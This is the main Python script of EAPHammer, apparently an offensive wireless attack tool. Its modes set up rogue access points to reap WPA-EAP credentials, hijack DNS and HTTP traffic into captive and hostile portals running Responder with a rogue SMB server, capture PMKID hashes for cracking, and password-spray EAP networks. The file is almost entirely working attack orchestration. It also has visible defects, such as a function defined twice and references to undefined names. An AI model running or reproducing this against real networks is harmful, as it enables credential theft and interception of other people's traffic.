#!/usr/bin/env python3.8

import argparse
import eaphammer_cert_wizard as cert_wizard
import eaphammer_core.cli
import eaphammer_core.eap_spray
import datetime
import json
import os
import signal
import subprocess
import sys
import time
import shutil

from argparse import ArgumentParser
from eaphammer_core import conf_manager, utils, responder, services
from eaphammer_core.autocrack import Autocrack
from eaphammer_core import iw_parse
from eaphammer_core.hostapd import HostapdEaphammer
from eaphammer_core.hostapd_config import HostapdConfig
from eaphammer_core.eap_user_file import EAPUserFile
from eaphammer_core.hostapd_mac_acl import HostapdMACACL
from eaphammer_core.hostapd_ssid_acl import HostapdSSIDACL
from eaphammer_core.known_ssids_file import KnownSSIDSFile
from eaphammer_core.responder_config import ResponderConfig
from eaphammer_core.lazy_file_reader import LazyFileReader
from eaphammer_core.redirect_server import RedirectServer
from eaphammer_core.wpa_supplicant import WPA_Supplicant
from eaphammer_core.wpa_supplicant_conf import WPASupplicantConf
from eaphammer_core.portal_server import PortalServer
from datetime import datetime
from multiprocessing import Queue
from eaphammer_settings import settings
from eaphammer.__version__ import __version__, __tagline__, __author__, __contact__, __codename__
from threading import Thread
from eaphammer_core.utils import ip_replace_last_octet
from eaphammer_core.loader import Loader

from eaphammer_core.module_maker import ModuleMaker

from distutils.util import strtobool

def hostile_portal():

    global responder

    lport = options['lport']
    lhost = options['lhost']
    lnet = ip_replace_last_octet(lhost, '0')
    lmask = '255.255.255.0'

    use_nm = strtobool(settings.dict['core']['eaphammer']['services']['use_network_manager'])
    stop_avahi = strtobool(settings.dict['core']['eaphammer']['services']['stop_avahi'])
    stop_dhcpcd = strtobool(settings.dict['core']['eaphammer']['services']['stop_dhcpcd'])


    use_autocrack = options['autocrack']
    wordlist = options['wordlist']
    if options['manual_config'] is None:
        interface = core.interface.Interface(options['interface'])
    else:
        interface_name = core.utils.extract_iface_from_hostapd_conf(options['manual_config'])
        interface = core.interface.Interface(interface_name)
    use_pivot = options['pivot']
    save_config = options['save_config']

    try:
        utils.Iptables.save_rules()
    
        # start autocrack if enabled
        if use_autocrack:

            autocrack = Autocrack.get_instance()
            autocrack.configure(wordlist=wordlist)
            autocrack.start()
            time.sleep(4)

        # prepare environment
        if use_nm:
            interface.nm_off()
        
        if stop_dhcpcd:
            services.Dhcpcd.stop()

        if stop_avahi:
            services.Avahi.stop()
        utils.set_ipforward(1)

        if options['auth'] == 'wpa-eap':

            # generate eap user file and write to tmp directory
            eap_user_file = EAPUserFile(settings, options)
            eap_user_file.generate()

        if options['mac_whitelist'] is not None or options['mac_blacklist'] is not None:
            hostapd_acl = HostapdMACACL(settings, options)
            hostapd_acl.generate()

        if options['ssid_whitelist'] is not None or options['ssid_blacklist'] is not None:
            hostapd_ssid_acl = HostapdSSIDACL(settings, options)
            hostapd_ssid_acl.generate()

        if options['known_beacons']:
            known_ssids_file = KnownSSIDSFile(settings, options)
            known_ssids_file.generate()

        # write hostapd config file to tmp directory
        hostapd_conf = HostapdConfig(settings, options)
        hostapd_conf.write()

        # start hostapd
        hostapd = HostapdEaphammer(settings, options)
        hostapd.start()

        # configure routing 
        interface.set_ip_and_netmask(lhost, lmask)
        os.system('route add -net %s netmask %s gw %s' %\
                 (lnet, lmask, lhost))

        # configure dnsmasq
        conf_manager.dnsmasq_captive_portal_cnf.configure(interface=str(interface),
                                                          lhost=lhost)
        services.Dnsmasq.hardstart('-C %s 2>&1' % settings.dict['paths']['dnsmasq']['conf'])

        # start RedirectServer
        rs = RedirectServer.get_instance()
        rs.configure(lhost)
        rs.start()

        # start Responder
        if use_pivot:

            print('[*] Pivot mode activated. Rogue SMB server disabled.')
            print ('[*] Run payload_generator to '
                        'generate a timed payload if desired.')

            settings.dict['core']['responder']['Responder Core']['SMB'] = 'Off'

        else:

            settings.dict['core']['responder']['Responder Core']['SMB'] = 'On'


        responder_conf = ResponderConfig(settings, options)
        responder_conf.write()

        resp = responder.Responder.get_instance()
        resp.start(str(interface))

        # set iptables policy, flush all tables for good measure
        utils.Iptables.accept_all()
        utils.Iptables.flush()
        utils.Iptables.flush('nat')

        # use iptables to redirect all DNS and HTTP(S) traffic to PHY
        utils.Iptables.route_dns2_addr(lhost, interface)
        utils.Iptables.route_http2_addr(lhost, interface)

        # pause execution until user quits
        input('\n\nPress enter to quit...\n\n')

        resp.stop()

        hostapd.stop()
        services.Dnsmasq.kill()
        rs.stop()
        if use_autocrack:
            autocrack.stop()

        # remove hostapd conf file from tmp directory
        if save_config:
            hostapd_conf.save()
        hostapd_conf.remove()

        if options['auth'] == 'wpa-eap':

            # remove eap user file from tmp directory
            eap_user_file.remove()

        if options['mac_whitelist'] is not None or options['mac_blacklist'] is not None:

            # remove acl file from tmp directory
            hostapd_acl.remove()

        if options['ssid_whitelist'] is not None or options['ssid_blacklist'] is not None:

            # remove acl file from tmp directory
            hostapd_ssid_acl.remove()

        # restore iptables to a clean state (policy, flush tables)
        utils.Iptables.accept_all()
        utils.Iptables.flush()
        utils.Iptables.flush('nat')

        utils.Iptables.restore_rules()

        # cleanly allow network manager to regain control of interface
        if use_nm:
            interface.nm_on()
            
        if stop_dhcpcd:
            services.Dhcpcd.start()

        if stop_avahi:
            services.Avahi.start()


    except KeyboardInterrupt:

        resp.stop()
    
        hostapd.stop()
        services.Dnsmasq.kill()
        rs.stop()
        resp.stop()
        if use_autocrack:
            autocrack.stop()

        # remove hostapd conf file from tmp directory
        if save_config:
            hostapd_conf.save()
        hostapd_conf.remove()

        if options['auth'] == 'wpa-eap':

            # remove eap user file from tmp directory
            eap_user_file.remove()

        if options['mac_whitelist'] is not None or options['mac_blacklist'] is not None:

            # remove acl file from tmp directory
            hostapd_acl.remove()

        if options['ssid_whitelist'] is not None or options['ssid_blacklist'] is not None:

            # remove acl file from tmp directory
            hostapd_ssid_acl.remove()
        
        # restore iptables to a clean state (policy, flush tables)
        utils.Iptables.accept_all()
        utils.Iptables.flush()
        utils.Iptables.flush('nat')

        utils.Iptables.restore_rules()

        # cleanly allow network manager to regain control of interface
        if use_nm:
            interface.nm_on()
            
        if stop_dhcpcd:
            services.Dhcpcd.start()

        if stop_avahi:
            services.Avahi.start()

def captive_portal_server_only():

    lport = options['lport']
    lhost = options['lhost']
    lnet = ip_replace_last_octet(lhost, '0')
    lmask = '255.255.255.0'

    try:

        # initialize, configure, and start PortalServer
        portal_server = PortalServer.get_instance()
        portal_server.configure(options)
        portal_server.start()
        
        ## pause execution until user quits
        input('\n\nPress enter to quit...\n\n')

        portal_server.stop()

    except KeyboardInterrupt:

        portal_server.stop()


def troll_defender():

    lport = options['lport']
    lhost = options['lhost']
    lnet = ip_replace_last_octet(lhost, '0')
    lmask = '255.255.255.0'

    use_nm = strtobool(settings.dict['core']['eaphammer']['services']['use_network_manager'])
    stop_avahi = strtobool(settings.dict['core']['eaphammer']['services']['stop_avahi'])
    stop_dhcpcd = strtobool(settings.dict['core']['eaphammer']['services']['stop_dhcpcd'])


    interface = core.interface.Interface(options['interface'])

    try:

        utils.Iptables.save_rules()

        if use_nm:
            interface.nm_off()
        
        if stop_dhcpcd:
            services.Dhcpcd.stop()

        if stop_avahi:
            services.Avahi.stop()

        options['essid'] = 'C:\\Temp\\Invoke-Mimikatz.ps1'

        if options['auth'] == 'wpa-eap':

            # generate eap user file and write to tmp directory
            eap_user_file = EAPUserFile(settings, options)
            eap_user_file.generate()

        if options['mac_whitelist'] is not None or options['mac_blacklist'] is not None:
            hostapd_acl = HostapdMACACL(settings, options)
            hostapd_acl.generate()

        if options['ssid_whitelist'] is not None or options['ssid_blacklist'] is not None:
            hostapd_ssid_acl = HostapdSSIDACL(settings, options)
            hostapd_ssid_acl.generate()

        if options['known_beacons']:
            known_ssids_file = KnownSSIDSFile(settings, options)
            known_ssids_file.generate()

        # write hostapd config file to tmp directory
        hostapd_conf = HostapdConfig(settings, options)
        hostapd_conf.write()

        # start hostapd
        hostapd = HostapdEaphammer(settings, options)
        hostapd.start()

        # pause execution until user quits  
        input('\n\nPress enter to quit...\n\n')

        hostapd.stop()
        hostapd_conf.remove()

        if options['auth'] == 'wpa-eap':

            # remove eap user file from tmp directory
            eap_user_file.remove()

        # cleanly allow network manager to regain control of interface
        if use_nm:
            interface.nm_on()
            
        if stop_dhcpcd:
            services.Dhcpcd.start()

        if stop_avahi:
            services.Avahi.start()

    except KeyboardInterrupt:

        hostapd.stop()

        hostapd_conf.remove()

        if options['auth'] == 'wpa-eap':

            # remove eap user file from tmp directory
            eap_user_file.remove()

        if options['mac_whitelist'] is not None or options['mac_blacklist'] is not None:

            # remove acl file from tmp directory
            hostapd_acl.remove()

        if options['ssid_whitelist'] is not None or options['ssid_blacklist'] is not None:

            # remove acl file from tmp directory
            hostapd_ssid_acl.remove()

        if options['known_beacons']:
            known_ssids_file.remove()

        # cleanly allow network manager to regain control of interface
        if use_nm:
            interface.nm_on()
            
        if stop_dhcpcd:
            services.Dhcpcd.start()

        if stop_avahi:
            services.Avahi.start()

def captive_portal():

    lport = options['lport']
    lhost = options['lhost']
    lnet = ip_replace_last_octet(lhost, '0')
    lmask = '255.255.255.0'

    if options['manual_config'] is None:
        interface = core.interface.Interface(options['interface'])
    else:
        interface_name = core.utils.extract_iface_from_hostapd_conf(options['manual_config'])
        interface = core.interface.Interface(interface_name)
    use_autocrack = options['autocrack']
    wordlist = options['wordlist']
    save_config = options['save_config']

    use_nm = strtobool(settings.dict['core']['eaphammer']['services']['use_network_manager'])
    stop_avahi = strtobool(settings.dict['core']['eaphammer']['services']['stop_avahi'])
    stop_dhcpcd = strtobool(settings.dict['core']['eaphammer']['services']['stop_dhcpcd'])



    try:

        utils.Iptables.save_rules()

        # prepare environment
        utils.set_ipforward(1)
        if use_nm:
            interface.nm_off()
        
        if stop_dhcpcd:
            services.Dhcpcd.stop()

        if stop_avahi:
            services.Avahi.stop()

        # start autocrack if enabled
        if use_autocrack:

            autocrack = Autocrack.get_instance()
            autocrack.configure(wordlist=wordlist)
            autocrack.start()

        if options['auth'] == 'wpa-eap':

            # generate eap user file and write to tmp directory
            eap_user_file = EAPUserFile(settings, options)
            eap_user_file.generate()

        if options['mac_whitelist'] is not None or options['mac_blacklist'] is not None:
            hostapd_acl = HostapdMACACL(settings, options)
            hostapd_acl.generate()

        if options['ssid_whitelist'] is not None or options['ssid_blacklist'] is not None:
            hostapd_ssid_acl = HostapdSSIDACL(settings, options)
            hostapd_ssid_acl.generate()

        if options['known_beacons']:
            known_ssids_file = KnownSSIDSFile(settings, options)
            known_ssids_file.generate()

        # write hostapd config file to tmp directory
        hostapd_conf = HostapdConfig(settings, options)
        hostapd_conf.write()

        # start hostapd
        hostapd = HostapdEaphammer(settings, options)
        hostapd.start()

        # configure routing 
        interface.set_ip_and_netmask(lhost, lmask)
        os.system('route add -net %s netmask %s gw %s' %
                    (lnet, lmask, lhost))

        # configure dnsmasq
        conf_manager.dnsmasq_captive_portal_cnf.configure(interface=str(interface),
                                                          lhost=lhost)
        services.Dnsmasq.hardstart('-C %s 2>&1' % settings.dict['paths']['dnsmasq']['conf'])

        ## start httpd
        #services.Httpd.start()
    

        # set iptables policy, flush all tables for good measure
        utils.Iptables.accept_all()
        utils.Iptables.flush()
        utils.Iptables.flush('nat')

        # use iptables to redirect all DNS and HTTP(S) traffic to PHY
        utils.Iptables.route_dns2_addr(lhost, interface)
        utils.Iptables.route_http2_addr(lhost, interface)
        
        # ADD CODE HERE
        # initialize, configure, and start PortalServer
        portal_server = PortalServer.get_instance()
        portal_server.configure(options)
        portal_server.start()
        ###
        
        ## pause execution until user quits
        input('\n\nPress enter to quit...\n\n')

        hostapd.stop()
        services.Dnsmasq.kill()

        #services.Httpd.stop()
        # ADD CODE HERE
        portal_server.stop()
        ###

        if use_autocrack:
            autocrack.stop()

        # remove hostapd conf file from tmp directory
        if save_config:
            hostapd_conf.save()
        hostapd_conf.remove()

        if options['auth'] == 'wpa-eap':

            # remove eap user file from tmp directory
            eap_user_file.remove()

        if options['mac_whitelist'] is not None or options['mac_blacklist'] is not None:

            # remove acl file from tmp directory
            hostapd_acl.remove()

        if options['ssid_whitelist'] is not None or options['ssid_blacklist'] is not None:

            # remove acl file from tmp directory
            hostapd_ssid_acl.remove()

        if options['known_beacons']:
            known_ssids_file.remove()
        
        # restore iptables to a clean state (policy, flush tables)
        utils.Iptables.accept_all()
        utils.Iptables.flush()
        utils.Iptables.flush('nat')

        utils.Iptables.restore_rules()

        # cleanly allow network manager to regain control of interface
        if use_nm:
            interface.nm_on()
            
        if stop_dhcpcd:
            services.Dhcpcd.start()

        if stop_avahi:
            services.Avahi.start()

    except KeyboardInterrupt:

        portal_server.stop()
        hostapd.stop()
        services.Dnsmasq.kill()
        portal_server.stop()
        if use_autocrack:
            autocrack.stop()

        # remove hostapd conf file from tmp directory
        if save_config:
            hostapd_conf.save()
        hostapd_conf.remove()

        if options['auth'] == 'wpa-eap':

            # remove eap user file from tmp directory
            eap_user_file.remove()

        if options['mac_whitelist'] is not None or options['mac_blacklist'] is not None:

            # remove acl file from tmp directory
            hostapd_acl.remove()

        if options['ssid_whitelist'] is not None or options['ssid_blacklist'] is not None:

            # remove acl file from tmp directory
            hostapd_ssid_acl.remove()

        if options['known_beacons']:
            known_ssids_file.remove()
        
        # restore iptables to a clean state (policy, flush tables)
        utils.Iptables.accept_all()
        utils.Iptables.flush()
        utils.Iptables.flush('nat')

        utils.Iptables.restore_rules()

        # cleanly allow network manager to regain control of interface
        if use_nm:
            interface.nm_on()
            
        if stop_dhcpcd:
            services.Dhcpcd.start()

        if stop_avahi:
            services.Avahi.start()

def troll_defender():

    lport = options['lport']
    lhost = options['lhost']
    lnet = ip_replace_last_octet(lhost, '0')
    lmask = '255.255.255.0'

    use_nm = strtobool(settings.dict['core']['eaphammer']['services']['use_network_manager'])
    stop_avahi = strtobool(settings.dict['core']['eaphammer']['services']['stop_avahi'])
    stop_dhcpcd = strtobool(settings.dict['core']['eaphammer']['services']['stop_dhcpcd'])


    interface = core.interface.Interface(options['interface'])

    try:

        utils.Iptables.save_rules()

        if use_nm:
            interface.nm_off()
        
        if stop_dhcpcd:
            services.Dhcpcd.stop()

        if stop_avahi:
            services.Avahi.stop()

        options['essid'] = 'C:\\Temp\\Invoke-Mimikatz.ps1'

        if options['auth'] == 'wpa-eap':

            # generate eap user file and write to tmp directory
            eap_user_file = EAPUserFile(settings, options)
            eap_user_file.generate()

        if options['mac_whitelist'] is not None or options['mac_blacklist'] is not None:
            hostapd_acl = HostapdMACACL(settings, options)
            hostapd_acl.generate()

        if options['ssid_whitelist'] is not None or options['ssid_blacklist'] is not None:
            hostapd_ssid_acl = HostapdSSIDACL(settings, options)
            hostapd_ssid_acl.generate()

        if options['known_beacons']:
            known_ssids_file = KnownSSIDSFile(settings, options)
            known_ssids_file.generate()

        # write hostapd config file to tmp directory
        hostapd_conf = HostapdConfig(settings, options)
        hostapd_conf.write()

        # start hostapd
        hostapd = HostapdEaphammer(settings, options)
        hostapd.start()

        # pause execution until user quits  
        input('\n\nPress enter to quit...\n\n')

        hostapd.stop()
        hostapd_conf.remove()

        if options['auth'] == 'wpa-eap':

            # remove eap user file from tmp directory
            eap_user_file.remove()

        # cleanly allow network manager to regain control of interface
        if use_nm:
            interface.nm_on()
            
        if stop_dhcpcd:
            services.Dhcpcd.start()

        if stop_avahi:
            services.Avahi.start()

    except KeyboardInterrupt:

        hostapd.stop()

        hostapd_conf.remove()

        if options['auth'] == 'wpa-eap':

            # remove eap user file from tmp directory
            eap_user_file.remove()

        if options['mac_whitelist'] is not None or options['mac_blacklist'] is not None:

            # remove acl file from tmp directory
            hostapd_acl.remove()

        if options['ssid_whitelist'] is not None or options['ssid_blacklist'] is not None:

            # remove acl file from tmp directory
            hostapd_ssid_acl.remove()

        if options['known_beacons']:
            known_ssids_file.remove()

        # cleanly allow network manager to regain control of interface
        if use_nm:
            interface.nm_on()
            
        if stop_dhcpcd:
            services.Dhcpcd.start()

        if stop_avahi:
            services.Avahi.start()

def reap_creds():

    lport = options['lport']
    lhost = options['lhost']
    lnet = ip_replace_last_octet(lhost, '0')
    lmask = '255.255.255.0'

    use_nm = strtobool(settings.dict['core']['eaphammer']['services']['use_network_manager'])
    stop_avahi = strtobool(settings.dict['core']['eaphammer']['services']['stop_avahi'])
    stop_dhcpcd = strtobool(settings.dict['core']['eaphammer']['services']['stop_dhcpcd'])


    if options['manual_config'] is None:
        interface = core.interface.Interface(options['interface'])
    else:
        interface_name = core.utils.extract_iface_from_hostapd_conf(options['manual_config'])
        interface = core.interface.Interface(interface_name)
    use_autocrack = options['autocrack']
    wordlist = options['wordlist']
    save_config = options['save_config']

    try:

        utils.Iptables.save_rules()

        # start autocrack if enabled
        if use_autocrack:

            autocrack = Autocrack.get_instance()
            autocrack.configure(wordlist=wordlist)
            autocrack.start()

        if use_nm:
            interface.nm_off()
        
        if stop_dhcpcd:
            services.Dhcpcd.stop()

        if stop_avahi:
            services.Avahi.stop()
            
            

        if options['auth'] == 'wpa-eap' or (options['reap_creds'] and options['auth'] is None):

            # generate eap user file and write to tmp directory
            eap_user_file = EAPUserFile(settings, options)
            eap_user_file.generate()

        if options['mac_whitelist'] is not None or options['mac_blacklist'] is not None:
            hostapd_acl = HostapdMACACL(settings, options)
            hostapd_acl.generate()

        if options['ssid_whitelist'] is not None or options['ssid_blacklist'] is not None:
            hostapd_ssid_acl = HostapdSSIDACL(settings, options)
            hostapd_ssid_acl.generate()

        if options['known_beacons']:
            known_ssids_file = KnownSSIDSFile(settings, options)
            known_ssids_file.generate()

        # write hostapd config file to tmp directory
        hostapd_conf = HostapdConfig(settings, options)
        hostapd_conf.write()

        # start hostapd
        hostapd = HostapdEaphammer(settings, options)
        hostapd.start()

        # pause execution until user quits  
        input('\n\nPress enter to quit...\n\n')

        hostapd.stop()
        if use_autocrack:
            autocrack.stop()

        # remove hostapd conf file from tmp directory
        if save_config:
            hostapd_conf.save()
        hostapd_conf.remove()

        if options['auth'] == 'wpa-eap':

            # remove eap user file from tmp directory
            eap_user_file.remove()

        if options['mac_whitelist'] is not None or options['mac_blacklist'] is not None:

            # remove acl file from tmp directory
            hostapd_acl.remove()

        if options['ssid_whitelist'] is not None or options['ssid_blacklist'] is not None:

            # remove acl file from tmp directory
            hostapd_ssid_acl.remove()

        if options['known_beacons']:
            known_ssids_file.remove()

        # cleanly allow network manager to regain control of interface
        if use_nm:
            interface.nm_on()
            
        if stop_dhcpcd:
            services.Dhcpcd.start()

        if stop_avahi:
            services.Avahi.start()

    except KeyboardInterrupt:

        hostapd.stop()
        if use_autocrack:
            autocrack.stop()

        # remove hostapd conf file from tmp directory
        if save_config:
            hostapd_conf.save()
        hostapd_conf.remove()

        if options['auth'] == 'wpa-eap':

            # remove eap user file from tmp directory
            eap_user_file.remove()

        if options['mac_whitelist'] is not None or options['mac_blacklist'] is not None:

            # remove acl file from tmp directory
            hostapd_acl.remove()

        if options['ssid_whitelist'] is not None or options['ssid_blacklist'] is not None:

            # remove acl file from tmp directory
            hostapd_ssid_acl.remove()

        if options['known_beacons']:
            known_ssids_file.remove()

        # cleanly allow network manager to regain control of interface
        if use_nm:
            interface.nm_on()
            
        if stop_dhcpcd:
            services.Dhcpcd.start()

        if stop_avahi:
            services.Avahi.start()

def pmkid_attack():

    lport = options['lport']
    lhost = options['lhost']
    lnet = ip_replace_last_octet(lhost, '0')
    lmask = '255.255.255.0'

    bssid = options['bssid']
    channel = options['channel']
    essid = options['essid']
    interface = core.interface.Interface(options['interface'])
    hcxpcaptool = settings.dict['paths']['hcxtools']['hcxpcaptool']['bin']
    hcxdumptool = settings.dict['paths']['hcxdumptool']['bin']
    hcxpcaptool_ofile = settings.dict['paths']['hcxtools']['hcxpcaptool']['ofile']
    hcxdumptool_ofile = settings.dict['paths']['hcxdumptool']['ofile']
    hcxdumptool_filter = settings.dict['paths']['hcxdumptool']['filter']
    loot_dir = settings.dict['paths']['directories']['loot']

    use_nm = strtobool(settings.dict['core']['eaphammer']['services']['use_network_manager'])
    stop_avahi = strtobool(settings.dict['core']['eaphammer']['services']['stop_avahi'])
    stop_dhcpcd = strtobool(settings.dict['core']['eaphammer']['services']['stop_dhcpcd'])


    interface.down()
    if use_nm:
        interface.nm_off()
        
    if stop_dhcpcd:
        services.Dhcpcd.stop()

    if stop_avahi:
        services.Avahi.stop()

    interface.mode_managed()
    interface.up()

    print('[*] Scanning for nearby access points...')
    networks = iw_parse.iw_parse.get_interfaces(interface=str(interface))
    print('[*] Complete!')
    time.sleep(.5)

    interface.down()
    interface.mode_monitor()
    interface.up()

    if bssid is not None:

        if channel is None:
            print('[*] No channel specified... finding appropriate channel...')
            channel = iw_parse.helper_functions.find_channel_from_bssid(bssid, networks)
            if channel is None:
                print('[!] Target network not found... aborting...')
                sys.exit()
            print('[*] Channel %d selected...' % channel)
            print('[*] Complete!')
        
        essid = iw_parse.helper_functions.find_essid_from_bssid(bssid, networks)
        if essid is None:
            print('[!] Target network is hidden...')
            essid = ''
    
    elif essid is not None:

        print('[*] No bssid or channel specified...')
        print('[*] ... searching for AP that has ESSID %s...' % essid)
        bssid = iw_parse.helper_functions.find_bssid_from_essid(essid, networks)
        if bssid is None:
            print('[!] Target network not found... aborting...')
            sys.exit()
        print('[*] BSSID %s selected...' % bssid)
        channel = iw_parse.helper_functions.find_channel_from_bssid(bssid, networks)
        if channel is None:
            print('[!] Target network not found... aborting...')
            sys.exit()
        print('[*] Channel %d selected...' % channel)
        print('[*] Complete!')
    
    else:
        raise Exception('BSSID or ESSID must be specified')

    print('[*] Creating filter file for target...')
    with open(hcxdumptool_filter, 'w') as fd:
        fd.write('%s' % bssid.replace(':', '').lower())
    print('[*] Complete!')

    print('[*] Running hcxdumptool...')
    print('%s -i %s -c %d -o %s --filtermode=2 --filterlist=%s --enable_status=3' % (hcxdumptool, interface, channel, hcxdumptool_ofile, hcxdumptool_filter))
    p = subprocess.Popen('%s -i %s -c %d -o %s --filtermode=2 --filterlist=%s --enable_status=3' % (hcxdumptool, interface, channel, hcxdumptool_ofile, hcxdumptool_filter), shell=True, stdout=subprocess.PIPE, preexec_fn=os.setsid)
    while True:
        line = p.stdout.readline().decode()
        print(line, end=' ')
        if 'FOUND PMKID CLIENT-LESS]' in line:
            break
    os.killpg(os.getpgid(p.pid), signal.SIGTERM)
    print('[*] Complete!')

    print('[*] Extracting hash from pcap file using hcxpcaptool...')
    os.system('%s -z %s %s' % (hcxpcaptool, hcxpcaptool_ofile, hcxdumptool_ofile))
    with open(hcxpcaptool_ofile) as fd:
        hash_str = fd.read()
        print('\thashcat format:', hash_str)
    print('[*] Complete!')

    save_file = os.path.join(loot_dir, '-'.join([
            essid,
            bssid,
            datetime.strftime(datetime.now(), '%Y-%m-%d-%H-%M-%S'),
            'PMKID.txt',
    ]))
    
    print('[*] Saving hash to %s' % save_file)
    with open(save_file, 'w') as fd:
        fd.write(hash_str)
    print('[*] Complete!')

    print('[*] Removing temporary files...')
    try:
        os.remove(hcxpcaptool_ofile)
    except OSError as e:
        print("Error: %s - %s" % (e.filename, e.strerror))
    try:
        os.remove(hcxdumptool_filter)
    except OSError as e:
        print("Error: %s - %s" % (e.filename, e.strerror))
    try:
        os.remove(hcxdumptool_ofile)
    except OSError as e:
        print("Error: %s - %s" % (e.filename, e.strerror))
    print('[*] Complete!')

def eap_spray():

    lport = options['lport']
    lhost = options['lhost']
    lnet = ip_replace_last_octet(lhost, '0')
    lmask = '255.255.255.0'

    # set variables from settings / options
    interfaces = options['interface_pool']
    essid = options['essid']
    password = options['password']
    input_file = options['user_list']
    output_file = settings.dict['paths']['eap_spray']['log']
    conf_dir = settings.dict['paths']['directories']['tmp']

    # instantiate pipelines
    input_queue = Queue()
    output_queue = Queue(maxsize=(len(interfaces) * 5))

    # instantiate workers
    producer = core.eap_spray.Producer(input_file, input_queue, len(interfaces))
    cred_logger = core.eap_spray.Cred_Logger(output_file, output_queue)
    worker_pool = core.eap_spray.Worker_Pool(interfaces, essid, password, input_queue, output_queue, conf_dir)

    # start everything (order matters)
    worker_pool.start()
    cred_logger.start()
    producer.run()

    # when producer reaches end of user_list file, everything else should
    # terminate
    worker_pool.join()
    cred_logger.join()

def save_config_only():

    lport = options['lport']
    lhost = options['lhost']
    lnet = ip_replace_last_octet(lhost, '0')
    lmask = '255.255.255.0'

    hostapd_conf = HostapdConfig(settings, options)
    hostapd_conf.write()
    hostapd_conf.save()
    hostapd_conf.remove()

def run_cert_wizard():

    if options['cert_wizard'] == 'import':
       
        cert_wizard.import_cert(options['server_cert'],
                    private_key_path=options['private_key'],
                    ca_cert_path=options['ca_cert'],
                    passwd=options['private_key_passwd'],
        )

    elif options['cert_wizard'] == 'create' or options['bootstrap']:

        if options['self_signed'] or options['bootstrap']:
            
            cert_wizard.bootstrap(options['cn'],
                                country=options['country'],
                                state_province=options['state'],
                                city=options['locale'],
                                organization=options['org'],
                                org_unit=options['org_unit'],
                                email_address=options['email'],
                                not_before=options['not_before'],
                                not_after=options['not_after'],
                                algorithm=options['algorithm'],
                                key_length=options['key_length'],
            )

        else:

            cert_wizard.create_server_cert(options['ca_cert'],
                            options['cn'],
                            signing_key_path=options['ca_key'],
                            signing_key_passwd=options['ca_key_passwd'],
                            country=options['country'],
                            state_province=options['state'],
                            city=options['locale'],
                            organization=options['org'],
                            org_unit=options['org_unit'],
                            email_address=options['email'],
                            not_before=options['not_before'],
                            not_after=options['not_after'],
                            algorithm=options['algorithm'],
                            key_length=options['key_length'],
            )

    elif options['cert_wizard'] == 'interactive':

            cert_wizard.interactive()

    elif options['cert_wizard'] == 'list':

            cert_wizard.list_certs()

    elif options['cert_wizard'] == 'dh':

            cert_wizard.rebuild_dh_file(options['key_length'])

    else:

        raise Exception('Invalid argument passed to --cert-wizard')

def list_templates():


    
    loader = Loader(paths=[settings.dict['paths']['wskeyloggerd']['usr_templates']],
                    mtype='MPortalTemplate')


    templates = loader.get_loadables()


    print()
    print('[*] Listing available captive portal templates:')
    print()
    for t in templates:

        print(t)
    print()
            
def am_i_rooot():

    print('[?] Am I root?')

    print('[*] Checking for rootness...')
    if not os.geteuid()==0:
        print('[!] not root, just really drunk.')
        sys.exit('[!] EAPHammer must be run as root: aborting.')

    print('[*] I AM ROOOOOOOOOOOOT')

    print('[*] Root privs confirmed! 8D')

def create_template():

    name = options['name']
    url = options['url']
    description = options['description']
    author = options['author']

    dl_form_message = options['dl_form_message']
    add_downloader = options['add_download_form']

    mm = ModuleMaker(name=name,
                     url=url,
                     description=description,
                     dl_form_message=dl_form_message,
                     add_downloader=add_downloader,
                     author=author)

    mm.run()

def delete_template():

    name = options['name']

    usr_tmpl_dir = settings.dict['paths']['wskeyloggerd']['usr_templates']

    del_path = os.path.join(usr_tmpl_dir, name)

    try:

        shutil.rmtree(del_path)

    except FileNotFoundError:

        print('[*] Template does not exist')

def print_banner():


    print('''
                     .__                                         
  ____ _____  ______ |  |__ _____    _____   _____   ___________ 
_/ __ \\\\__  \\ \\____ \\|  |  \\\\__  \\  /     \\ /     \\_/ __ \\_  __ \\
\\  ___/ / __ \\|  |_> >   Y  \\/ __ \\|  Y Y  \\  Y Y  \\  ___/|  | \\/
 \\___  >____  /   __/|___|  (____  /__|_|  /__|_|  /\\___  >__|   
     \\/     \\/|__|        \\/     \\/      \\/      \\/     \\/       


                        %s

                             Version:  %s
                            Codename:  %s
                              Author:  %s
                             Contact:  %s

    ''' % (__tagline__, __version__, __codename__, __author__, __contact__))

def main():
    print_banner()

    options = eaphammer_core.cli.set_options()

    am_i_rooot()

    if options['debug']:
        print('[debug] Settings:')
        print(json.dumps(settings.dict, indent=4, sort_keys=True))
        print('[debug] Options:')
        print(json.dumps(options, indent=4, sort_keys=True))

    if options['cert_wizard'] or options['bootstrap']:
        run_cert_wizard()
    elif options['list_templates']:
        list_templates()
    elif options['save_config_only']:
        save_config_only()        
    elif options['captive_portal']:
        captive_portal()
    elif options['captive_portal_server_only']:
        captive_portal_server_only()
    elif options['hostile_portal']:
        hostile_portal()
    elif options['pmkid']:
        pmkid_attack()
    elif options['eap_spray']:
        eap_spray()
    elif options['troll_defender']:
        troll_defender()
    elif options['create_template']:
        create_template()
    elif options['delete_template']:
        delete_template()
    else:
        reap_creds()
